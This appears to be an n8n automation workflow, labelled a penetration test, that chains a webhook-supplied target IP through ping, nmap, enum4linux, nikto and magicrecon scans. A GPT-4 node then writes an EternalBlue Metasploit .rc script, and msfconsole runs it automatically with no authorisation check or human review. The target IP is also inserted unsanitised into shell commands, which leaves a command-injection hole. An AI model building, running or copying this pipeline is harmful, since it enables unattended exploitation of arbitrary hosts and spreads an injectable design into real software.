{
    "nodes": [
      {
        "parameters": {
          "path": "penetration-test",
          "method": "POST"
        },
        "name": "Webhook Trigger",
        "type": "n8n-nodes-base.webhook",
        "position": [200, 300]
      },
      {
        "parameters": {
          "command": "ping -c 3 {{$json[\"query\"].target_ip}}"
        },
        "name": "Ping Target",
        "type": "n8n-nodes-base.executeCommand",
        "position": [400, 300]
      },
      {
        "parameters": {
          "command": "if [ -f \"nmap_scan.txt\" ]; then cat nmap_scan.txt; else nmap -A -T4 {{$json[\"query\"].target_ip}} | tee nmap_scan.txt; fi"
        },
        "name": "Nmap Scan",
        "type": "n8n-nodes-base.executeCommand",
        "position": [600, 300]
      },
      {
        "parameters": {
          "command": "grep -E '445/tcp open|135/tcp open' nmap_scan.txt && echo 'SMB Ports Open' || echo 'No SMB Ports'"
        },
        "name": "Check SMB Ports",
        "type": "n8n-nodes-base.executeCommand",
        "position": [800, 200]
      },
      {
        "parameters": {
          "command": "enum4linux -a {{$json[\"query\"].target_ip}}"
        },
        "name": "Run Enum4Linux",
        "type": "n8n-nodes-base.executeCommand",
        "position": [1000, 200]
      },
      {
        "parameters": {
          "model": "gpt-4",
          "prompt": "Based on this enum4linux output, generate an .rc script to exploit EternalBlue:\n\n{{$node[\"Run Enum4Linux\"].output}}"
        },
        "name": "Generate Exploit Script",
        "type": "n8n-nodes-base.openai",
        "position": [1200, 200]
      },
      {
        "parameters": {
          "command": "msfconsole -r generated_exploit.rc"
        },
        "name": "Run Metasploit Exploit",
        "type": "n8n-nodes-base.executeCommand",
        "position": [1400, 200]
      },
      {
        "parameters": {
          "command": "grep -E '80/tcp open|443/tcp open' nmap_scan.txt && echo 'Web Ports Open' || echo 'No Web Ports'"
        },
        "name": "Check Web Ports",
        "type": "n8n-nodes-base.executeCommand",
        "position": [800, 400]
      },
      {
        "parameters": {
          "command": "nikto -h {{$json[\"query\"].target_ip}}"
        },
        "name": "Run Nikto",
        "type": "n8n-nodes-base.executeCommand",
        "position": [1000, 400]
      },
      {
        "parameters": {
          "command": "magicrecon -d {{$json[\"query\"].target_ip}}"
        },
        "name": "Run MagicRecon",
        "type": "n8n-nodes-base.executeCommand",
        "position": [1000, 600]
      },
      {
        "parameters": {
          "model": "gpt-4",
          "prompt": "Based on these web vulnerability scans, suggest Metasploit or Exploit-DB options:\n\nNikto: {{$node[\"Run Nikto\"].output}}\n\nMagicRecon: {{$node[\"Run MagicRecon\"].output}}"
        },
        "name": "Analyze Web Exploits",
        "type": "n8n-nodes-base.openai",
        "position": [1200, 500]
      }
    ],
    "connections": {
      "Webhook Trigger": {
        "main": [[{"node": "Ping Target", "type": "main"}]]
      },
      "Ping Target": {
        "main": [[{"node": "Nmap Scan", "type": "main"}]]
      },
      "Nmap Scan": {
        "main": [
          [{"node": "Check SMB Ports", "type": "main"}],
          [{"node": "Check Web Ports", "type": "main"}]
        ]
      },
      "Check SMB Ports": {
        "main": [[{"node": "Run Enum4Linux", "type": "main"}]]
      },
      "Run Enum4Linux": {
        "main": [[{"node": "Generate Exploit Script", "type": "main"}]]
      },
      "Generate Exploit Script": {
        "main": [[{"node": "Run Metasploit Exploit", "type": "main"}]]
      },
      "Check Web Ports": {
        "main": [[{"node": "Run Nikto", "type": "main"}], [{"node": "Run MagicRecon", "type": "main"}]]
      },
      "Run Nikto": {
        "main": [[{"node": "Analyze Web Exploits", "type": "main"}]]
      },
      "Run MagicRecon": {
        "main": [[{"node": "Analyze Web Exploits", "type": "main"}]]
      }
    }
  }
  